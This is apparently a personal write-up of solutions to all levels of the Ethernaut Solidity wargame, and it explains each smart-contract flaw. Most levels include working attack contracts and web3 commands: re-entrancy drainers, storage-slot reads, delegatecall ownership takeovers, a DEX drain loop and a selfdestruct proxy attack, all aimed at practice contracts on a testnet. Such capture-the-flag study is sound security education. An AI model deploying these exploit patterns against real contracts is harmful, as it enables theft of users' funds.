# Ethernaut Solutions

The [Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity-based wargame inspired by [overthewire.org](https://overthewire.org/),
played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.

Here are the writeups of my solutions for all the levels. Ironically I will not recommend you to look at these or any other writeups, solve it yourself to get a high dopamine rush 😛

[Link](https://lace-cough-9cf.notion.site/Ethernaut-Solutions-392c14212c4047b49c9743b9e069c880) to notion documentation.

# 0. Hello Ethernaut

It was more of an introductory level, helping you set up for the upcoming levels and giving bits of the basic but necessary information. So let’s look into `contract.info()` as hinted in point number 9.

```jsx
> await contract.info()
< 'You will find what you need in info1().'

> await contract.info1()
< 'Try info2(), but with "hello" as a parameter.'

> await contract.info2("hello")
< 'The property infoNum holds the number of the next info method to call.'
```

Let’s explore more about this property in the contracts abi.

```jsx
> await contract.abi
< (11) [{…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}]
0: {inputs: Array(1), stateMutability: 'nonpayable', type: 'constructor', constant: undefined, payable: undefined}
1: {inputs: Array(1), name: 'authenticate', outputs: Array(0), stateMutability: 'nonpayable', type: 'function', …}
2: {inputs: Array(0), name: 'getCleared', outputs: Array(1), stateMutability: 'view', type: 'function', …}
3: {inputs: Array(0), name: 'info', outputs: Array(1), stateMutability: 'pure', type: 'function', …}
4: {inputs: Array(0), name: 'info1', outputs: Array(1), stateMutability: 'pure', type: 'function', …}
5: {inputs: Array(1), name: 'info2', outputs: Array(1), stateMutability: 'pure', type: 'function', …}
6: {inputs: Array(0), name: 'info42', outputs: Array(1), stateMutability: 'pure', type: 'function', …}
7:
constant: true
inputs: []
name: "infoNum"
outputs: Array(1)
0: {internalType: 'uint8', name: '', type: 'uint8'}
length: 1
[[Prototype]]: Array(0)
payable: undefined
signature: "0xc253aebe"
stateMutability: "view"
type: "function"
[[Prototype]]: Object
8: {inputs: Array(0), name: 'method7123949', outputs: Array(1), stateMutability: 'pure', type: 'function', …}
9: {inputs: Array(0), name: 'password', outputs: Array(1), stateMutability: 'view', type: 'function', …}
10: {inputs: Array(0), name: 'theMethodName', outputs: Array(1), stateMutability: 'view', type: 'function', …}
length: 11
[[Prototype]]: Array(0)
```

Seeing the abi object of **infoNum** **it is clear that the return type of the function is a **uint8**, **infoNum** is probably the default getter function for the infoNum storage variable of the contract. Since there is no built-in unsigned integer type in Javascript, it receives the value as a typed ArrayBuffer, you can stringify it to see the actual integer. We can see that there is also a function named **password** at index 9.

```jsx
> x = await contract.infoNum()

> x.toString()
< '42'
```

Calling the **info42** method

```jsx
> await contract.info42()
< 'theMethodName is the name of the next method.'

> await contract.theMethodName()
< 'The method name is method7123949.'

> await contract.method7123949()
< 'If you know the password, submit it to authenticate().'

> await contract.password()
< 'ethernaut0'

> await contract.authenticate("ethernaut0")
```

Submit the instance, and congrats you cleared your first ethernaut level!!

# 1. Fallback

The initial owner has 1000 ether as his contribution, so getting ownership of the contract through `contribute()` is clearly not the best way since 1000 ether is quite a lot(well you can spend weeks or even months collecting that amount from Rinkeby faucets, your choice 😛). But surely there is a better way using the other functions given. It’s an easy task to figure out what it is so we will just let the solution speak.

```jsx
// calling the contribute() with the right amount of ether to pass the condition.
> await contract.contribute({value:toWei("0.0001", "ether")})

// since the contract has a payable fallback receive fuction we will just send a
// transaction to the contract with some amount of ether and empty data(so that the
// fallback function is called)
> await web3.eth.sendTransaction({to:"0x1B5D18EDfdD898caeadd43Cf4e1f1857d55BC075", 
	value:toWei("0.0001", "ether"), from:"0x136801a295932bEcE62ef615bEFC3DE0259D565F"})

// in the "owner" storage variable we will see our address now!!
> await contract.owner()
'0x136801a295932bEcE62ef615bEFC3DE0259D565F'

// withdraw everything using the withdraw() given
> await contract.withdraw() 
```

# 2. Fallout

Well, this was an easy one if you spot the difference. The function which is marked as a constructor for the contract is actually a normal public function because of the typo in its spelling. It is `Fal1out()` instead of `Fallout()`. So, let’s simply call this function to become the owner.

```jsx
> await contract.Fal1out({value:"10"})
```

# 3. Coin Flip

The `flip()` is using the current block number to decide the side of the coin, so the random-seeming function is not really random. We can access the block number in a separate smart contract and predict the output of the `flip()`. The only thing we need to take care of is this piece of code.

```jsx
if (lastHash == blockValue) {
      revert();
    }
```

So you cannot use a for loop and call the `flip()` 10 times in a single transaction since that transaction will be written in a single block and in the second iteration of the loop the **lastHash** will become equal to the **blockValue** resulting in a revert. Let’s quickly write a contract on Remix.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract Test {
    using SafeMath for uint256;
    CoinFlip public coinFlip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 public currNumber = 0;

    constructor(address conFlipAddress) public {
        coinFlip = CoinFlip(conFlipAddress);
    }

    function IncreaseItBy1() public {
        coinFlip.flip(getBool());
    }

    function getBool() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip1 = blockValue.div(FACTOR);
        bool side = coinFlip1 == 1 ? true : false;
        return side;
    }
}
```

We will deploy this contract on Rinkeby and call the `IncreaseItBy1()` manually 10 times. We can verify the results by getting the value of **consecutiveWins** storage variable.

```jsx
> x = await contract.consecutiveWins()

> x.toString()
< '10'
```

# 4. Telephone

The conditional in the `changeOwner()` can be passed only if the origin of the transaction is not the same as the last message sender. The `tx.origin` global variable refers to the original external account that started the transaction while `msg.sender` refers to the immediate account (it could be external or another contract account) that invokes the function. So we will simply need to write an intermediate contract and invoke the `changeOwner()` from it.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract Test {
    Telephone public telephone;

    constructor(address telephoneContractAddress) public {
        telephone = Telephone(telephoneContractAddress);
    }

    function forwardTransaction(address newOwner) public {
        telephone.changeOwner(newOwner);
    }
}
```

# 5. Token

This is a simple uint overflow problem since there are no **SafeMath** checks for uint overflows. Passing any number larger than 20 to the **value** param of the `transfer()` will do the job for us. For example, passing 21 will result in 20 - 21 which is equal to UintMax.

```solidity
> await contract.transfer("0x70147a35F3f84F7D4d7c8bA5a89648e3cFBDAA5C", 21)

> x = await contract.balanceOf("0x136801a295932bEcE62ef615bEFC3DE0259D565F")

> x.toString()
< '115792089237316195423570985008687907853269984665640564039457584007913129639935'
```

# 6. Delegation

To solve this level it is essential that you know how the low level `delegatecall()` works. You can refer to [offical documentation](https://solidity-by-example.org/delegatecall/) of solidity or you can go through this [blog](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c). A delegatecall calls functions of another contract but keep the context(including storage) of the calling contract. Notice that owner storage variable of **Delegate** and that of **Delegation** have the same slot(slot 0)of the storage memory. So passing the signature of the `pwn()` of Delegate to the delegate call in the fallback of Delegation contract will do the job for us.

```solidity
> web3.eth.abi.encodeFunctionSignature("pwn()")
< '0xdd365b8b'

> await web3.eth.sendTransaction({from:"0x136801a295932bEcE62ef615bEFC3DE0259D565F",
 data:"0xdd365b8b", to:"0x9a54baB051D444c9169A863d6acb1B368317D66f"})

> await contract.owner()
< '0x136801a295932bEcE62ef615bEFC3DE0259D565F'
```

# 7. Force

The code of the contract is not given, though from hint 1 we can interpret that there must be a payable `fallback()` implemented in **Force** which reverts if you send non-zero ether. All you need to know to solve this level is the `selfdestruct()`. When a contract self destroys itself all the balance of the contract is transferred to the address given as an input to the selfdestruct function. Let's write a contract with a function implementing selfdestruct and pass the address of the given contract to it. Don’t forget to transfer some ether to the contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Test {
    address payable public owner;

    constructor() public {
        owner = msg.sender;
    }

    function selfDestroMe(address attackingContractAddress) public payable {
        address payable addr = payable(attackingContractAddress);
        selfdestruct(addr);
    }

    receive() external payable {}
}
```

# 8. Vault

Well, private variables in solidity are not really private, by default all state variables in solidity are stored in storage in slots of length 32 bytes, and we can access the storage using **web3.js**! For reading about storage in detail you can refer to [this](https://medium.com/coinmonks/a-quick-guide-to-hack-private-variables-in-solidity-b45d5acb89c0) blog.

```solidity
> await web3.eth.getStorageAt("0x0a9b7e8dF1fD7751B70631Baf9c0314010B42CaE", 1)
< '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'

> await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")

> await contract.locked()
< false
```

# 9. King

We have to prevent others from reclaiming kingship once we claim it even though they send higher amount of money. So we can make a contract king having a `receive()` which reverts all received transactions having ether. Let's find out the current prize value first.

```jsx
> x = await contract.prize()

> x.toString()
< '1000000000000000'
```

Will use Remix to create a contract transferring an equal amount of ether to it and will claim kingship using that contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract Test {
    King public king;

    constructor() public {
        king = King(0xF4c4D4685143B5580eecF0C1A6ae18FC41c934B0);
    }

    function send() public {
        (bool sent, bytes memory data) = address(king).call{
            value: address(this).balance
        }("");
        require(sent, "transaction failed");
    }

    function getMoney() public payable {}

    receive() external payable {
        revert();
    }
}
```

The job is done! Any transaction sending ether to this contract will revert.

# 10. Re-entrancy

From name, it is clear that this level is based on the famous **Ethereum DAO attack** because of which Ethereum classic was formed. The hack here is that in the `withdraw()` first the money is sent to the caller contract and after that, the balance of the caller contract is deducted. What if the caller contract has a receive function which again calls the withdraw function? The execution will never reach `balances[msg.sender] -= _amount;` and the balance of the entire contract will be drained. Here is the solution contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Re-entrancy.sol";

contract Test {
    Reentrance public re;

    constructor(address payable addr) public {
        re = Reentrance(addr);
    }

    function withdraw() public {
        re.withdraw(0.001 ether);
    }

    function addFunds() public payable {}

    receive() external payable {
        if (address(this).balance < 0.002 ether) {
            withdraw();
        }
    }
}
```

# 11.  Elevator

This level is all about interfaces. Once you know that an interface can be used to communicate between two contracts and one contract can implement interface from another contract,  you can easily solve this level. In our attack contract, we just have to implement the `isLastFloor()` of the **Building** interface in a way that the conditions in the `goTo()` are bypassed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract Test {
    Elevator public ele;
    bool private isT = false;

    constructor(address payable addr) public {
        ele = Elevator(addr);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        if (!isT && floor == 1) {
            isT = true;
            return false;
        } else {
            return true;
        }
    }

    function callGoTo() public {
        ele.goTo(1);
    }
}
```

# 12. Privacy

One more level requiring accessing storage slots. We have to read the third element of the data array, typecast it into **bytes16** and pass it to the `unlock()`. The **locked** variable will take a single byte in slot0, **ID** will take the entire slot1, **flattening** will take a single byte in slot2, **denomination** will also take a single byte in slot2 and **awkwardness** will take 2 bytes in slot2. The first 2 elements of the array will take slot3 and slot4 respectively, so we have to read slot5 for the 3rd element. Then we have to typecast it into bytes16 which means we will have to take the first 16 bytes or first 32 hex numbers.

```jsx
> await web3.eth.getStorageAt("0x2AeF1B262681889d9699148C3714B9eF0ee6C1c0", 5)
< '0x9f984ee6ac946c55997a19f2301fa67ab97734eab6778dc6706f348efdbf2570

> x = '0x9f984ee6ac946c55997a19f2301fa67ab97734eab6778dc6706f348efdbf2570'

> x = x.slice(2)

> x.slice(0, x.length/2)
< '9f984ee6ac946c55997a19f2301fa67a'

> await contract.unlock('0x9f984ee6ac946c55997a19f2301fa67a')

> await contract.locked()
< false
```

# 13. GateKeeper One

To complete this level we have two pass 3 gates. Gate one is easy to crack as it is same as the **Telephone** level. Gate three is similar to the **Token** level, we have to reverse engineer a gate key. Gate two is a little interesting, the gas left when the execution reaches it should be divisible by 8191. There are a lot of methods to crack this gate but I guess brute force is the best(and easiest 😛). We can get a minimum limit to the gas that the original execution will require by removing the gate two modifier from the `enter()` and deploying this contract to the Rinkeby test net. Call the `enter()` of the modified contract from remix and you will get a minimum limit to the gas. The `gateThree()` has simple comparison statements so it will definitely not burn more than $10000$ units of gas. So we can brute force from $minGasVal + 8191$ to  $minGasVal + 8191 + 10000$.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GateKeeperOne.sol";

contract Test {
    GatekeeperOne public gatekeeperOne;
    bytes8 private key = 0x100000000000f7c3;

    constructor(address addr) public {
        gatekeeperOne = GatekeeperOne(addr);
    }

    function forwardTransaction() public {
        for (uint256 i = 30000; i < 40000; ++i) {
            (bool sent, bytes memory data) = address(gatekeeperOne).call{
                gas: i
            }(abi.encodeWithSignature("enter(bytes8)", key));
        }
    }
}
```

# 14. GateKeeper Two

Gate one is as same as the previous level[.](http://level.In) The second gate checks that the calling contract should have zero size. The constructor can be helpful here. The constructor is called once when the contract is created and at that time the `extcodesize(size of the contract)` is 0. We can write our code in the constructor of the contract to bypass gate two. Gate three utilizes simple xor properties, xor of 2 same numbers is 0 and xor of 0 and a number is that number. The expression $uint64(0) - 1$ is simply the max value of uint64. So our key should be

```solidity
uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this)))) ^ uint64Max
```

Solution contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatKeeperTwo.sol";

contract Test {
    GatekeeperTwo public gatekeepertwo;

    constructor() public {
        gatekeepertwo = GatekeeperTwo(
            0xFbcFC31a63672cF5a58B35EEfA37e072B7584476
        );
        uint64 mx = 18446744073709551615;
        uint64 x = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 keyresult = x ^ mx;
        gatekeepertwo.enter(bytes8(keyresult));
    }
}
```

# 15. Naught Coin

To complete this level we must read the [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec carefully. We can use the **transferFrom** method of the ERC20 contract which has not been overridden in the **Naught Coin** contract. First, we have to approve our own wallet to use our tokens, we can do that using the `approve()`.

```jsx
> x = await contract.INITIAL_SUPPLY()

> x.toString()
< '1000000000000000000000000'

> await contract.approve("0x136801a295932bEcE62ef615bEFC3DE0259D565F", 
< '1000000000000000000000000')

> await contract.transferFrom("0x136801a295932bEcE62ef615bEFC3DE0259D565F",
< "0xB70B5095274a6255890624e026a9C0e5c950f7C3", '1000000000000000000000000')
```

# 16. Preservation

Another level based on delegate calls. Using the context retaining behaviour of delegate calls, we can set the value of **timeZone1Library** variable to address of our attack contract through the **storedTime** variable of the **LibraryContract**. Using our attack contract we just have to modify the value of the 3rd memory slot.

Deploy the below attack contract on the Rinkeby testnet. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import "./Preservation.sol";

contract Test {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    constructor() public {
        timeZone1Library = 0x21fbaeE432a4C99837c086A10b525344FB80331B;
        timeZone2Library = 0x21fbaeE432a4C99837c086A10b525344FB80331B;
    }

    function setTime(uint256 _time) public {
        owner = 0x136801a295932bEcE62ef615bEFC3DE0259D565F;
    }
}
```

Calling the `setSecondTime()` with the deployed contract address will set the value of **timeZone1Library** to the required address.

```jsx
> await contract.setSecondTime("0xd9145CCE52D386f254917e481eB44e9943F39138")

> await contract.setFirstTime(12)

> await contract.owner()
< '0x136801a295932bEcE62ef615bEFC3DE0259D565F'
```

  

# 17.  Recovery

The address of a contract is deterministic and can be generated using the **address** and **nonce** of the origin(a contract or ethereum wallet address) of the transaction used to create the contract. So we can determine the contract of the generated address using the nonce and address of the Recovery contract.

```jsx
// To get the nonce
> await web3.eth.getTransactionCount("0xE505051D14fcb647fb646886BF0Ebef3De80a54c")
< 2
```

The value of nonce must have been 1 less than this when the **SimpleToken** contract was generated. From a little Googling we can use a standard function to get the contract address from these values.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Test {
    address public _origin = 0xE505051D14fcb647fb646886BF0Ebef3De80a54c;

    constructor() public {}

    function getContractAddress() public view returns (address) {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xd6),
                                bytes1(0x94),
                                _origin,
                                bytes1(0x01)
                            )
                        )
                    )
                )
            );
    }
}
```

We can use this address to connect to the contract thorugh remix and then use it’s `destroy()` to transfer the ether to some other address.

# 18.  Magic Number

It took me the most to solve this level. If a write a contract using solidity having the `whatIsTheMeaningOfLife()` it will easily be more than 10 opcodes long. So we have to write raw opcodes and deploy it to the testnet. You can read this [blog](https://leftasexercise.com/2021/09/05/a-deep-dive-into-solidity-contract-creation-and-the-init-code/) to get a good insight of solidity opcodes and contract creation.

Basically any contract is divided into 2 sets of opcodes **Initialization** opcodes and **Runtime** opcodes. The intialization opcodes are run during the contract creation(the constructor for example) and store the future runtime opcodes. The runtime opcodes contains the actual logic of execution. The initialization opcodes are not considered while calculating the size of the contract. So the runtime opcodes should be less than equal to 10 in size.

First let’s construct the runtime opcode. We will use this [list](https://github.com/crytic/evm-opcodes) to reference instruction opcodes.

- Since we have to return $42$ when the opcodes at the contract address are called, we will store $0x2a$(hex of 42) in memory using `mstore(position, hex value)`(opcode - 52) and `push1`(opcode - 60)

```
602a // push1 0x2a --> hex value
6080 // push1 0x80 --> arbitrary slot in memory
52   // mstore  
```

- Then we will return the value of this slot using `return(position, size)` (opcode-f3).

```
6020 // push1 0x20 (slot size)
6080 // push1 0x80 (the position of the slot)
f3  // return
```

The final opcode after combining these 2 is **602a60805260206080f3** having a size of 10 opcodes.

Now let’s construct the initialization opcode using which we will store our logic opcodes to the memory and return it to the evm. For this we will use the `codecopy(destination position, position of runtime opcode, size of runtime opcode)` opcode. The runtime opcode starts right after the initialization opcode, so we need to construct it first to get the position of runtime opcode.

- Let’s copy the runtime opcodes into memory.

```
600a  // push1 0x0a --> size of runtime opcode
60XX  // push1 0xXX --> position of runtime opcode(currently unknown)
6000  // push1 0x00 --> destination memory index
39    // opcode for codecopy
```

- Now lets return these opcodes to the evm.

```
600a // push1 0x0a --> size of runtime opcode
6000 // push1 0x00 --> address of slot
f3   // return
```

The initialization opcode in total takes 12 bytes so the starting position of the runtime opcode will be the 13th byte or 12th index(0x0c index). Value of XX will be 0c. Final initialization sequence **600a600c600039600a6000f3.**

Combining instruction and runtime sequences → **0x600a600c600039600a6000f3602a60805260206080f3**

After deploying it we get the contract address.

![Screenshot 2022-03-28 at 5.10.13 PM.png](Ethernaut%20%204894c/Screenshot_2022-03-28_at_5.10.13_PM.png)

Now we just to have call the `solver()` with this address and submit the instance!

```jsx
> await contract.setSolver("0xc36e8be9B17A837545EACf46283fC708bd5D7629")
```

# 19. Alien Codex

The given contract inherits from **Ownable** contract. From the [source code](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol) of the **Ownable.sol** we can see that there is a variable **owner**. To become owner we somehow have to change the value of this storage variable. The address type takes 20 bytes, checking the value at slot 0 confirms that the owner variable is stored at slot 0. The boolean storage variable contact also takes 1 byte and thus will be stored in slot 0 only. Lets make it true so that we can access all other functions.

```jsx
> await web3.eth.getStorageAt("0x3F0c21f0d6336a22c8B1158776d179aD321842A9", 0)
< '0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'

> await contract.make_contact()

> await contract.contact()
< true
```

To solve further we need to understand how dynamic array [storage](https://docs.soliditylang.org/en/v0.4.25/miscellaneous.html#layout-of-state-variables-in-storage) works in solidity. So the slot1 contains the length of the array and the first element of the array will be stored at slot value given `by keccak256(abi.encodePacked(1)).` We can obtain this value using a little solidity script.

```solidity
contract Test {
    function something() public pure returns(bytes32){
        uint val = 1;
        return keccak256(abi.encodePacked(val));
    }
}
```

**0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6** is the value returned by this function.

There are total 2^256 slots in memory, lets assume that the array length is very large, so if the 0 index of array is at 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 slot and there are total 2^256 slots so the 0th slot of array will be at 2^256 -0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 = **0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a**.

Using this value as an index we can change the value of the **owner** storage variable. Using underflow through the retract function we can make the length of array very large.

```jsx
> await contract.retract() // The array length is set to a large value

> await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", 
"0x000000000000000000000000136801a295932bEcE62ef615bEFC3DE0259D565F")

> await contract.owner()
< '0x136801a295932bEcE62ef615bEFC3DE0259D565F'
```

We can submit the instance now!

# 20. Denial

The withdraw function uses the low level `call` function to tranfer ether to the partner and it continues whether the call succeeds or not. From the documentation of solidity a call function forwards all the gas if the amount of gas to forward is not specified. To create a denial of service we can write a contract with a fallback payable function having an infinite loop and set **partner** to its address.

The hack:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Denial.sol";

contract Test {
    Denial public dn;

    constructor() public {
        dn = Denial(0xf97545fAbf11c1838c18422d113d3520a96825c7);
    }

    function withdraw() public {
        dn.withdraw();
    }

    function addFunds() public payable {}

    fallback() external payable {
        while (true) {}
    }
}
```

# 21. Shop

The level is similar to **Elevator** except the fact that `price()` has a view restriction. So we cannot use a storage variable for conditional purposes. But if we see the `buy()` of the **Shop** contract carefully, the **isSold** variable is set to true before the `price()` is called again, so that’s it! We can use this varibale in our contract as conditional to return appropriate value of **price**.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract Test {
    Shop public shp;
    uint256 counter = 0;

    constructor() public {
        shp = Shop(0xC0cfe0098085BB0b7206b40d3e7abD657E2183ab);
    }

    function price() external view returns (uint256) {
        bool sold = shp.isSold();
        if (!sold) return 100;
        else return 50;
    }

    function callBuy() public {
        shp.buy();
    }
}
```

Let’s check the price to confirm whether our logic worked or not

```jsx
> x = await contract.price()

> x.toString()
< '50'
```

# 22. Dex

It’s more of a mathematics question, we somehow have to make the **swap_amount** more than the amount of tokens we passed to the `swap()` so that, for example, we get 11 tokens in exchange of 10. What if we pass all our token2 to the contract using the `add_liquidity()` and then swap all remaining 10 token1 for token2? The return value of swap will be $(10 * 110)/100$ which is equal to 11! If we continue this process we will able to drain all the token1 of the contract. In this logic there is a little case to handle in the end but it’s not that tough to understand. Here is the hack contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Dex.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/ERC20.sol";

contract Test {
    Dex public dex;
    address token1 = 0xFCA0F3B28AAf8622ba232ac17e8D519a07e5c40B;
    address token2 = 0xac3F86A90a1460AfF13a31eC3F4B31145D8bEB6b;
    address dexContract = 0x0662FE0BB0904C2dd80ffab818Ac23e3176664c0;
    address myWallet = 0xB70B5095274a6255890624e026a9C0e5c950f7C3;

    constructor() public {
        dex = Dex(dexContract);
        dex.approve(dexContract, 200);
        dex.approve(token1, 200);
        dex.approve(token2, 200);
    }

    function transferTokenToDex() public {
        dex.add_liquidity(token2, 10);
    }

    function transferTokenToThis() public {
        IERC20(token1).transferFrom(myWallet, address(this), 10);
        IERC20(token2).transferFrom(myWallet, address(this), 10);
    }

    function makeContractEmpty() public {
        while (true) {
            if (
                dex.balanceOf(token1, dexContract) == 0 ||
                dex.balanceOf(token2, dexContract) == 0
            ) return;
            if (dex.balanceOf(token1, address(this)) != 0) {
                uint256 swapprice = dex.get_swap_price(
                    token1,
                    token2,
                    dex.balanceOf(token1, address(this))
                );
                if (swapprice > dex.balanceOf(token2, dexContract)) {
                    dex.swap(
                        token1,
                        token2,
                        dex.balanceOf(token1, dexContract)
                    );
                    return;
                }
                dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
            } else {
                uint256 swapprice = dex.get_swap_price(
                    token2,
                    token1,
                    dex.balanceOf(token2, address(this))
                );
                if (swapprice > dex.balanceOf(token1, dexContract)) {
                    dex.swap(
                        token2,
                        token1,
                        dex.balanceOf(token2, dexContract)
                    );
                    return;
                }
                dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
            }
        }
    }
}
```

Don’t forget to approve your metamask wallet and this contract to use your tokens.

# 23. Dex Two

If we see the `swap()` carefully the require statement ensuring that the from and to addresses should be addresses of token1 and token2 is removed. Easy enough! We can deploy an external contract having a `tranferFrom()` which returns true and a `balanceOf()` which retuns 1. Using this we can drain the contract of both the tokens! Lets deploy the contract below:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./hadcoins.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/ERC20.sol";

contract Test {
    constructor() public {}

    function balanceOf(address sender) public pure returns (uint256) {
        return 1;
    }

    function transferFrom(
        address sender,
        address getter,
        uint256 amount
    ) public pure returns (bool) {
        return true;
    }
}
```

We will use the address of this contract as an input to the from param of the swap().

```jsx
> await contract.token1()
< "0x96D050054b99c4682226F908F615E5DD00597bB9"

> await contract.token2()
< "0x87Cc0a307378fE1Fc3683a547143508ce149c16d"

> await contract.swap("0xb19424ae78Ee74A6207E69B9e4D88a8A9c695E47",
< "0x96D050054b99c4682226F908F615E5DD00597bB9", 1)

> await contract.swap("0xb19424ae78Ee74A6207E69B9e4D88a8A9c695E47",
< "0x87Cc0a307378fE1Fc3683a547143508ce149c16d", 1)
```

# 24. Puzzle Wallet

To solve this level we should read about **UpgradeableProxy** first. You can go through OpenZeppelin [docs](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies) for that. So a proxy forwards a call to a contract through a delegate call and thus using it’s own storage for variables. We can change the value of admin if we can call the `setMaxBalance()` and change the value of **maxBalance**. For that, first we have to get whitelisted and then we have to make the balance of the contract zero.

We can become the owner of the **PuzzleWallet** contract by setting **pendingAdmin** to our address. We somehow have to call the `proposeNewAdmin()`. We cannot directly call that function but we can send a transaction to the evm with data containning the signature of the `proposeNewAdmin()` with input as our wallet address.

```jsx
> await web3.eth.sendTransaction({from:"0x136801a295932bEcE62ef615bEFC3DE0259D565F", to:"0x6cACA6D3bBbf65feb39cC5684d1B1B7B5b295091",
data:"0xa6376746000000000000000000000000136801a295932bece62ef615befc3de0259d565f"})

> await contract.owner()
< '0x136801a295932bEcE62ef615bEFC3DE0259D565F'
```

So we are now the owner of the **PuzzleWallet** contract. Let’s whitelist our wallet address.

```jsx
> await contract.addToWhitelist("0x136801a295932bEcE62ef615bEFC3DE0259D565F")

> await web3.eth.getBalance("0x6cACA6D3bBbf65feb39cC5684d1B1B7B5b295091")
< '1000000000000000'
```

To make the balance of the contract zero we somehow have to make our balances value equal to that of the contract. But as we see the contract already have some ether. What if we call the `multicall` with data[0] as signature of `deposit()` and data[1] as signature of `multicall(deposit())`?

The recursive call will use the same `msg.val` and will deposit ether worth double the value. So if we send *1000000000000000 wei* our balance will become *2000000000000000 wei* which will be same as the balance of the contract! Then we can use the `execute()` to make the balance of the contract zero and then the `setMaxBalance()` to change the **maxBalance** value to our wallet address.

```jsx
> data0 = web3.eth.abi.encodeFunctionSignature("deposit()")

> data1 = web3.eth.abi.encodeFunctionSignature("multicall(bytes[])")

> data2 = web3.eth.abi.encodeParameter("bytes[]", data0)

> data3 = data1 + data2.substring(2) // strip 0x before adding

> await contract.multicall([data0, data3], {value:"1000000000000000"}) // calling multicall(data0, data3)

> await contract.execute("0x136801a295932bEcE62ef615bEFC3DE0259D565F", 2000000000000000, "0x")

> await contract.setMaxBalance("0x136801a295932bEcE62ef615bEFC3DE0259D565F")
```

That’s it !! We are now the admin of the proxy contract.

# 25. Motorbike

 To destroy the **Engine** contract we have to call `upgradeToAndCall()` with address of a contract having a function implementing selfdestruct. In the data param we will pass the signature of the function implementing selfdestruct. Googling about the **Intializable** contract and the initializer modifier I found out that the checks of the initializer modifier can be bypassed if the `initialize()` function of the **Engine** contract is called directly and not through the **Motorbike** proxy contract. For this we need the address of the **Engine** contract. From the constructor of the **Motorbike** contract it is clear that the address of the logic contract is stored in the **_IMPLEMENTATION_SLOT**. Let’s get that value.

```jsx
> await web3.eth.getStorageAt("0x51d7F75fd2876D8Bb5Eb9CB7B39Cdf3f16837079", 
"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
< '0x000000000000000000000000218d0e62641a2e1b3d7f72dee3b77ff29c3f7f7e'
```

Now we can use remix to load the contract at that address and call the initialize function, after that we will become the upgrader of the contract. Let’s quickly deploy a contract having a function implementing selfdestuct.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/ERC20.sol";

contract Test {
    constructor() public {}

    function getAbi() public pure returns (bytes memory) {
        return abi.encodeWithSignature("forDestruction()");
    }

    function forDestruction() public {
        selfdestruct(payable(address(this)));
    }
}
```

From remix we will call the `upgradeToAndCall()` with address of the new contract as the first argument and signature of `forDestruction()` as the second argument. That’s it the **Engine** contract is destroyed!